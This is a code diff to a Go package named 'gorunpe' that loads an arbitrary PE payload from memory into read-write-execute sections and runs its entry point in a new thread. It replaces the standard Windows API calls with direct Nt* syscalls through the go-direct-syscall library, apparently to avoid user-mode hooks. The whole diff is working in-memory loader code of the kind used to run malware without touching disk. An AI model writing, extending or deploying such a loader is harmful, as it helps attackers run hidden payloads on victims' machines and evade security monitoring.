@@ -3,92 +3,91 @@ package gorunpe
 import (
 	"bytes"
 	"fmt"
+	"time"
 	"unsafe"
-	"syscall"
+
 	"github.com/Binject/debug/pe"
-	"golang.org/x/sys/windows"
+	"github.com/carved4/go-direct-syscall"
 )
 
-var (
-	modNtdll               = syscall.NewLazyDLL("ntdll.dll")
-	procNtCreateSection    = modNtdll.NewProc("NtCreateSection")
-	procNtMapViewOfSection = modNtdll.NewProc("NtMapViewOfSection")
-
-	modKernel32      = syscall.NewLazyDLL("kernel32.dll")
-	procCreateThread = modKernel32.NewProc("CreateThread")
-)
-
-// NTSTATUS type for checking return values from NT functions
-type NTSTATUS uintptr
-
-// ACCESS_MASK for NTAPI permissions
-type ACCESS_MASK uint32
-
-// SECTION_INHERIT for NtMapViewOfSection
-type SECTION_INHERIT uint32
-
+// Constants for values not provided by winapi
 const (
-	STATUS_SUCCESS                NTSTATUS      = 0x00000000
-	SECTION_MAP_READ              ACCESS_MASK   = 0x0004
-	SECTION_MAP_WRITE             ACCESS_MASK   = 0x0002
-	SECTION_MAP_EXECUTE           ACCESS_MASK   = 0x0008
-	NT_SECTION_DESIRED_ACCESS     ACCESS_MASK   = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE // 0xE
-	ViewShare                     SECTION_INHERIT = 1
-	SEC_COMMIT_LITERAL            uint32        = 0x08000000 // Using literal due to potential environment issues with windows.SEC_COMMIT
+	// Pseudo-handle for current process
+	CURRENT_PROCESS = ^uintptr(0) // -1 as uintptr
 )
 
 // ntCreateSection wraps the NtCreateSection syscall.
-func ntCreateSection(sizeOfImage uint32) (sectionHandle windows.Handle, err error) {
-	var hSection windows.Handle
-	maxSize := int64(sizeOfImage) // NtCreateSection expects *LARGE_INTEGER
+func ntCreateSection(sizeOfImage uint32) (sectionHandle uintptr, err error) {
+	var hSection uintptr
+	maxSize := uint64(sizeOfImage) // NtCreateSection expects *uint64
 
-	// NtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle)
-	r1, _, e1 := procNtCreateSection.Call(
-		uintptr(unsafe.Pointer(&hSection)), // SectionHandle (*PHANDLE)
-		uintptr(NT_SECTION_DESIRED_ACCESS), // DesiredAccess (ACCESS_MASK)
-		0,                                  // ObjectAttributes (*POBJECT_ATTRIBUTES = NULL)
-		uintptr(unsafe.Pointer(&maxSize)),  // MaximumSize (*PLARGE_INTEGER)
-		windows.PAGE_EXECUTE_READWRITE,     // SectionPageProtection (ULONG)
-		uintptr(SEC_COMMIT_LITERAL),        // AllocationAttributes (ULONG)
-		0)                                  // FileHandle (HANDLE = NULL for pagefile-backed)
+	// Use go-direct-syscall for NtCreateSection
+	status, err := winapi.NtCreateSection(
+		&hSection,                         // SectionHandle (*uintptr)
+		winapi.SECTION_ALL_ACCESS,         // DesiredAccess (ACCESS_MASK)
+		0,                                 // ObjectAttributes (*POBJECT_ATTRIBUTES = NULL)
+		&maxSize,                          // MaximumSize (*uint64)
+		winapi.PAGE_EXECUTE_READWRITE,     // SectionPageProtection (ULONG)
+		winapi.SEC_COMMIT,                 // AllocationAttributes (ULONG)
+		0)                                 // FileHandle (HANDLE = NULL for pagefile-backed)
 
-	if e1 != nil && e1 != syscall.Errno(0) { // Check for actual error from Call itself
-		return 0, fmt.Errorf("NtCreateSection system call failed: %w", e1)
+	if err != nil {
+		return 0, fmt.Errorf("NtCreateSection failed: %w", err)
 	}
-	if NTSTATUS(r1) != STATUS_SUCCESS {
-		return 0, fmt.Errorf("NtCreateSection failed with NTSTATUS: 0x%x", NTSTATUS(r1))
+	if !winapi.IsNTStatusSuccess(status) {
+		return 0, fmt.Errorf("NtCreateSection failed with NTSTATUS: 0x%x", status)
 	}
 	return hSection, nil
 }
 
-// ntMapViewOfSection wraps the NtMapViewOfSection syscall.
-func ntMapViewOfSection(sectionHandle windows.Handle, sizeOfImage uint32) (baseAddress uintptr, err error) {
-	var bAddress uintptr
-	viewSize := uintptr(sizeOfImage) // NtMapViewOfSection expects *PSIZE_T for ViewSize
+// ntMapViewOfSection wraps the NtMapViewOfSection syscall with retry logic.
+func ntMapViewOfSection(sectionHandle uintptr, sizeOfImage uint32) (baseAddress uintptr, err error) {
+	const maxRetries = 10
+	const baseDelay = 10 * time.Millisecond
 
-	// NtMapViewOfSection(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect)
-	r1, _, e1 := procNtMapViewOfSection.Call(
-		uintptr(sectionHandle),              // SectionHandle
-		uintptr(windows.CurrentProcess()),   // ProcessHandle (GetCurrentProcess())
-		uintptr(unsafe.Pointer(&bAddress)),  // BaseAddress (*PVOID, set to 0 for system to choose)
-		0,                                   // ZeroBits (ULONG_PTR)
-		0,                                   // CommitSize (SIZE_T, 0 to map entire committed section)
-		0,                                   // SectionOffset (*PLARGE_INTEGER, NULL)
-		uintptr(unsafe.Pointer(&viewSize)),  // ViewSize (*PSIZE_T, map entire section)
-		uintptr(ViewShare),                  // InheritDisposition (SECTION_INHERIT)
-		0,                                   // AllocationType (ULONG, 0 for MEM_COMMIT if section is SEC_COMMIT)
-		windows.PAGE_EXECUTE_READWRITE)      // Win32Protect (ULONG)
+	for attempt := 0; attempt < maxRetries; attempt++ {
+		var bAddress uintptr
+		viewSize := uintptr(sizeOfImage) // NtMapViewOfSection expects *uintptr for ViewSize
 
-	if e1 != nil && e1 != syscall.Errno(0) { // Check for actual error from Call itself
-		return 0, fmt.Errorf("NtMapViewOfSection system call failed: %w", e1)
+		// Small delay before each attempt (except the first)
+		if attempt > 0 {
+			delay := time.Duration(attempt) * baseDelay
+			time.Sleep(delay)
+		}
+
+		// Use go-direct-syscall for NtMapViewOfSection
+		status, err := winapi.NtMapViewOfSection(
+			sectionHandle,                     // SectionHandle
+			CURRENT_PROCESS,                   // ProcessHandle (GetCurrentProcess())
+			&bAddress,                         // BaseAddress (*uintptr)
+			0,                                 // ZeroBits (ULONG_PTR)
+			0,                                 // CommitSize (SIZE_T, 0 to map entire committed section)
+			nil,                               // SectionOffset (*uint64, NULL to map from beginning)
+			&viewSize,                         // ViewSize (*uintptr)
+			winapi.ViewShare,                  // InheritDisposition (SECTION_INHERIT)
+			0,                                 // AllocationType (ULONG, 0 for MEM_COMMIT if section is SEC_COMMIT)
+			winapi.PAGE_EXECUTE_READWRITE)     // Win32Protect (ULONG)
+
+		if err != nil {
+			return 0, fmt.Errorf("NtMapViewOfSection failed: %w", err)
+		}
+		if !winapi.IsNTStatusSuccess(status) {
+			return 0, fmt.Errorf("NtMapViewOfSection failed with NTSTATUS: 0x%x", status)
+		}
+		
+		// Success case: we got a valid base address
+		if bAddress != 0 {
+			return bAddress, nil
+		}
+		
+		// If we got status success but null base address, retry
+		// This can happen due to timing issues with section creation
+		if attempt == maxRetries-1 {
+			return 0, fmt.Errorf("NtMapViewOfSection returned NULL base address after %d attempts", maxRetries)
+		}
 	}
-	if NTSTATUS(r1) != STATUS_SUCCESS {
-		return 0, fmt.Errorf("NtMapViewOfSection failed with NTSTATUS: 0x%x", NTSTATUS(r1))
-	}
-	if bAddress == 0 {
-		return 0, fmt.Errorf("NtMapViewOfSection returned a NULL base address")
-	}
-	return bAddress, nil
+	
+	return 0, fmt.Errorf("unexpected exit from retry loop")
 }
 
 func ExecuteInMemory(payload []byte) error {
@@ -141,7 +140,7 @@ func ExecuteInMemory(payload []byte) error {
 
 	// 3. Allocate memory for the PE image using NtCreateSection and NtMapViewOfSection
 	var baseAddress uintptr
-	var sectionHandle windows.Handle
+	var sectionHandle uintptr
 
 	sectionHandle, err = ntCreateSection(sizeOfImage)
 	if err != nil {
@@ -150,7 +149,7 @@ func ExecuteInMemory(payload []byte) error {
 	// Ensure the section handle is closed when the function returns or panics
 	defer func() {
 		if sectionHandle != 0 {
-			windows.CloseHandle(sectionHandle)
+			winapi.NtClose(sectionHandle)
 		}
 	}()
 
@@ -159,13 +158,13 @@ func ExecuteInMemory(payload []byte) error {
 		// sectionHandle will be closed by the defer above
 		return fmt.Errorf("ntMapViewOfSection failed: %w", err)
 	}
-	
+
 	// Setup cleanup function for unmapping the view in case of failure before execution takes over
 	// The section handle is closed by its own defer statement.
 	cleanup := func() {
 		if baseAddress != 0 {
-			windows.UnmapViewOfFile(baseAddress) // NtUnmapViewOfSection could also be used here
-			// baseAddress = 0 // Mark as unmapped
+			// Use NtUnmapViewOfSection instead of UnmapViewOfFile
+			winapi.NtUnmapViewOfSection(CURRENT_PROCESS, baseAddress)
 		}
 	}
 
@@ -181,11 +180,11 @@ func ExecuteInMemory(payload []byte) error {
 		// For BSS sections, VirtualSize can be > 0 but Size == 0 (no raw data)
 		// We should still process them for proper memory layout, but there's no data to copy
 		// The memory was already zero-initialized by NtCreateSection(SEC_COMMIT) + NtMapViewOfSection.
-		
+
 		if section.VirtualSize == 0 {
 			continue
 		}
-		
+
 		if section.Size > 0 {
 			sectionData, err := section.Data()
 			if err != nil {
@@ -219,14 +218,20 @@ func ExecuteInMemory(payload []byte) error {
 	// The previous VirtualProtect loop is not needed.
 
 	// 10. Flush the instruction cache to ensure CPU doesn't execute stale instructions
-	procFlushInstructionCache := modKernel32.NewProc("FlushInstructionCache")
-	_, _, _ = procFlushInstructionCache.Call(
-		uintptr(windows.CurrentProcess()),
+	// Use NtFlushInstructionCache instead of FlushInstructionCache
+	status, err := winapi.NtFlushInstructionCache(
+		CURRENT_PROCESS,
 		baseAddress,
 		uintptr(sizeOfImage),
 	)
-	// This call usually returns a non-zero error code even on success
-	// so we ignore the error here
+	if err != nil {
+		cleanup()
+		return fmt.Errorf("NtFlushInstructionCache failed: %w", err)
+	}
+	if !winapi.IsNTStatusSuccess(status) {
+		cleanup()
+		return fmt.Errorf("NtFlushInstructionCache failed with status: 0x%x", status)
+	}
 
 	// 11. Call TLS callbacks if present
 	if err := ExecuteTLSCallbacks(peFile, baseAddress); err != nil {
@@ -234,49 +239,59 @@ func ExecuteInMemory(payload []byte) error {
 		return fmt.Errorf("TLS callback execution failed: %w", err)
 	}
 
-	// 12. Execute entry point using CreateThread
+	// 12. Execute entry point using NtCreateThreadEx
 	entryPoint := baseAddress + uintptr(addressOfEntryPoint)
-	var threadId uint32
+	var threadHandle uintptr
 
-	// CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
-	hThread, _, e1 := procCreateThread.Call(
-		0,                               // lpThreadAttributes (NULL)
-		0,                               // dwStackSize (0 for default)
-		entryPoint,                      // lpStartAddress
-		0,                               // lpParameter (NULL)
-		0,                               // dwCreationFlags (0 to run immediately)
-		uintptr(unsafe.Pointer(&threadId))) // lpThreadId
+	// Use NtCreateThreadEx instead of CreateThread
+	status, err = winapi.NtCreateThreadEx(
+		&threadHandle,                         // ThreadHandle (*uintptr)
+		winapi.THREAD_ALL_ACCESS,              // DesiredAccess (THREAD_ALL_ACCESS)
+		0,                                     // ObjectAttributes (NULL)
+		CURRENT_PROCESS,                       // ProcessHandle
+		entryPoint,                            // StartRoutine
+		0,                                     // Argument (NULL)
+		0,                                     // CreateFlags (0 for run immediately)
+		0,                                     // ZeroBits
+		0,                                     // StackSize (0 for default)
+		0,                                     // MaximumStackSize (0 for default)
+		0)                                     // AttributeList (NULL)
 
-	if e1 != nil && e1 != syscall.Errno(0) { // Check for actual error from Call itself
+	if err != nil {
 		cleanup()
-		return fmt.Errorf("CreateThread system call failed: %w", e1)
+		return fmt.Errorf("NtCreateThreadEx failed: %w", err)
 	}
-	if hThread == 0 {
+	if !winapi.IsNTStatusSuccess(status) {
 		cleanup()
-		return fmt.Errorf("CreateThread failed to create thread, handle is NULL")
+		return fmt.Errorf("NtCreateThreadEx failed with status: 0x%x", status)
+	}
+	if threadHandle == 0 {
+		cleanup()
+		return fmt.Errorf("NtCreateThreadEx failed to create thread, handle is NULL")
 	}
 
-	threadHandle := windows.Handle(hThread)
-	defer windows.CloseHandle(threadHandle) // Ensure thread handle is closed eventually
+	defer winapi.NtClose(threadHandle) // Ensure thread handle is closed eventually
 
-	// Wait for the thread to complete.
+	// Wait for the thread to complete using NtWaitForSingleObject
 	// If the entry point calls ExitProcess, this wait will be interrupted.
 	// If the entry point is well-behaved and returns, this will allow cleanup.
-	event, err := windows.WaitForSingleObject(threadHandle, windows.INFINITE)
+	status, err = winapi.NtWaitForSingleObject(
+		threadHandle,
+		false, // Alertable (FALSE)
+		nil)   // Timeout (NULL for infinite wait)
+
 	if err != nil {
-		// Even if WaitForSingleObject fails, we should attempt cleanup if possible,
+		// Even if NtWaitForSingleObject fails, we should attempt cleanup if possible,
 		// though the state of the created thread is unknown.
-		// cleanup() // cleanup will be called at the end of the function regardless in this path
-		return fmt.Errorf("WaitForSingleObject on created thread call failed: %w", err)
+		return fmt.Errorf("NtWaitForSingleObject on created thread call failed: %w", err)
 	}
 
-	if event == windows.WAIT_FAILED {
+	if !winapi.IsNTStatusSuccess(status) {
 		// This specific error indicates the function itself failed, not just a timeout or abandonment.
-		// cleanup() // cleanup will be called at the end
-		return fmt.Errorf("WaitForSingleObject on created thread failed")
+		return fmt.Errorf("NtWaitForSingleObject on created thread failed with status: 0x%x", status)
 	}
-	
-	// If WaitForSingleObject returns (e.g. thread exited normally),
+
+	// If NtWaitForSingleObject returns (e.g. thread exited normally),
 	// we can proceed to cleanup mapped memory.
 	// If the executable called ExitProcess(), this part might not be reached.
 	cleanup()
